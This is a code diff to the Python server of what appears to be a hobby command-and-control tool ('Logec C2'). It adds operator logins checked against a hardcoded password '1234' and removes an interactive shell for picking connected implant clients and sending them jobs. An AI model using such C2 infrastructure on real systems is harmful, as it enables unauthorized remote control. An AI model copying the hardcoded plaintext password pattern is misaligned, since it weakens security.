@@ -16,6 +16,9 @@ class s_sock:
     ##########
     ## Main Thread/Class
     ##########
+    def __init__(self):
+        self.server_password = "1234"
+    
     def socket_cleanup(self):
         #pass
         self.server.close()
@@ -34,6 +37,10 @@ class s_sock:
         
         self.clients = {}
         self.current_clients = []
+        
+        self.friendly_current_clients = []
+        self.friendly_clients = {}
+
         
         
         ## threading for clients, each connection will do a new thread (need to make sure each thread dies properly)
@@ -64,122 +71,94 @@ class s_sock:
             print(f"\nID: {self.id}") if global_debug else None
             print(f"MSG: {self.message}") if global_debug else None
             
-            #message = "ok"
-            #self.conn.send(message.encode())
-            
-            ## Creating the name in format of '127_0_0_1_QWERT' aka 'IP_ID'
-            client_name = "client_" + self.ip_address.replace(".", "_") + "_" + self.id
-            ## If the client hasn't been seen before, create new client ID n stuff
-            if client_name not in self.current_clients:
-                self.current_clients.append(client_name)
+            ## I'm sorry for the nested if's :( can definently split this up a bit into functions
+            ## interact with server, on first connection
+            if self.id == "!_user_!":
+                username, password = self.message.split("//|\\\\")
                 
-                ## creating object intance
-                self.client = s_perclient()
+                ## == Password Eval
+                print(username, password)
+                if self.password_eval(password) == True:
+                    self.conn.send("0".encode())
+                    print(f"Successful logon from {username}")
+                    
+                    friendly_client_name = f"!!~{username}"
+                    
+                    ## == Handle client (maybe create a function...)
+                    ## doing the same class trick as in below
+                    if friendly_client_name not in self.friendly_current_clients:
+                        self.friendly_current_clients.append(friendly_client_name)
 
-                # something dict
-                self.clients[client_name] = self.client
-                
-                ''' THis is what the dict looks like, each "name" is pointing at a class object
-                clients = {
-                    "client_192_168_0_1_1": <s_perclient object at 0x7fda883e4c70>,
-                    "client_192_168_0_2_1": <s_perclient object at 0x7fda883e4d00>,
-                    "client_192_168_0_2_2": <s_perclient object at 0x7fda883e4d90>
-                }
-                '''
-
-                globals()[client_name] = self.client
-            
-            else:
-                ##errmsg here
-                pass
-
-            ## TLDR, this is passing the ID, and Message recieved to the correct class & then that class handles it 
-            thread = threading.Thread(target=self.client.handle_client, args=(self.conn, self.ADDR, self.response, self.id))
-
-            thread.start()  
-    
-    ## This is temporarily imitating logec code, will get reworked eventually
-    def client_interact(self):
-        if os.name == "nt":
-            os.system("cls")
-
-        else:
-            os.system("clear")
-
-        ## This will be returned to the client later
-        print(" ===== Logec C2 Manual Shell +++++\n\n")
-        
-        print("\n\n========Current Clients========")
-        for var_name in globals():
-            if var_name.startswith("client_"):
-                print(var_name)
-        print("===============================")
-        print("!! Clients populate on heartbeat, be patient\n\n")
-        
-        ## dict 
-        client_name = input("Enter a client name to interact, 'help', or 'refresh': ")
-
-        # get the corresponding instance from the clients dictionary and call its method
-        if client_name in self.clients:
-            client_instance = self.clients[client_name]
-            
-            while True:
-                user_input_for_client = input(f"Client (jobs for options): [{self.ip_address}]: ")
-
-                if user_input_for_client == "home":
-                    self.client_interact()
+                        self.friendly_client = s_friendlyclient()
+                        
+                        self.friendly_clients[friendly_client_name] = self.friendly_client
+                        
+                        globals()[friendly_client_name] = self.friendly_client
+                        
+                        ## temp printing friendyl clients
+                        print("FriendlyClients:") if global_debug else None
+                        for var_name in globals():
+                            if var_name.startswith("!!~"):
+                                print(var_name)
 
                 else:
-                    client_instance.interact(user_input_for_client)
-        
-        elif client_name.lower() == "refresh":
-            '''if os.name == "nt":
-                os.system("cls")
+                    print(f"Failed logon from {username}")
+                    self.conn.send("1".encode())
 
-            else:
-                os.system("clear")'''
+            ## handling commands - ma ynot need this
+            ## elif friendly_client_name in friendly_client_name_list:
+                ## friendly_client_name.interact()
 
-            self.client_interact()
-
-        elif client_name.lower() == "stats":
-            stats_list = []
-
-            for client_name, client_instance in self.clients.items():
-                ## Maybe turn into JSON for transport back to safe client
-                stats_string = (
-                    f"Client: {client_name}",
-                    f"Heartbeats: {client_instance.stats_heartbeats}",
-                    f"Heartbeat Interval: {client_instance.stats_heartbeats}",
-                    f"Non wait Jobs run: {client_instance.stats_jobsrun}",
-                    f"Last Checkin: {client_instance.stats_latestcheckin}"
-                )
-
-                #print(stats_string)
-                stats_list.append(f"{stats_string}\n")
-                # access the variable from the client instance
-                variable_value = client_instance.stats_heartbeats
-                
-                # do something with the variable value, e.g. print it
-                #print(f"{client_name}: {variable_value}")
-
-            print(stats_list)
-            input("Type home for home: ")
-            self.client_interact()
-        elif client_name.lower() == "help":
-            print(
-            "Home: \n" \
-            "refresh - refreshes the current connected clients \n" \
-            "stats - ' [BETA] Prints all clients stats'\n" \
-            )
-            ## change these to enter
-            input("Type Home for Home: ")
-            self.client_interact()
-
-        else:
-            print(f"{client_name} not found.")
-            os.system("clear")
-            self.client_interact()
             
+            ## Client filter, make this an elif somehow, so if nothing matches, it drops
+            else:
+                ## Creating the name in format of '127_0_0_1_QWERT' aka 'IP_ID'
+                client_name = "client_" + self.ip_address.replace(".", "_") + "_" + self.id
+                ## If the client hasn't been seen before, create new client ID n stuff
+                if client_name not in self.current_clients:
+                    self.current_clients.append(client_name)
+                    
+                    ## creating object intance
+                    self.client = s_perclient()
+
+                    # something dict
+                    self.clients[client_name] = self.client
+                    
+                    ''' THis is what the dict looks like, each "name" is pointing at a class object
+                    clients = {
+                        "client_192_168_0_1_1": <s_perclient object at 0x7fda883e4c70>,
+                        "client_192_168_0_2_1": <s_perclient object at 0x7fda883e4d00>,
+                        "client_192_168_0_2_2": <s_perclient object at 0x7fda883e4d90>
+                    }
+                    '''
+
+                    globals()[client_name] = self.client
+                
+                else:
+                    ##errmsg here
+                    pass
+
+                ## TLDR, this is passing the ID, and Message recieved to the correct class & then that class handles it 
+                thread = threading.Thread(target=self.client.handle_client, args=(self.conn, self.ADDR, self.response, self.id))
+
+                thread.start()  
+    
+    
+
+    
+    def password_eval(self, password) -> bool:
+        ## decrypt pass
+        if password == self.server_password:
+            return True
+        else:
+            return False
+        
+       
+class s_friendlyclient:
+    
+    def incoming_command_process(self):
+        pass 
+
 
 ##########
 ## Per Client Class
@@ -355,7 +334,8 @@ if __name__ == "__main__":
 
     background_listen = threading.Thread(target=SERV.start_server, args=('0.0.0.0',100))
     background_listen.start() 
+    print("server started")
     
     #SERV.start_server('0.0.0.0',8092)
     
-    SERV.client_interact()
+    #SERV.client_interact()
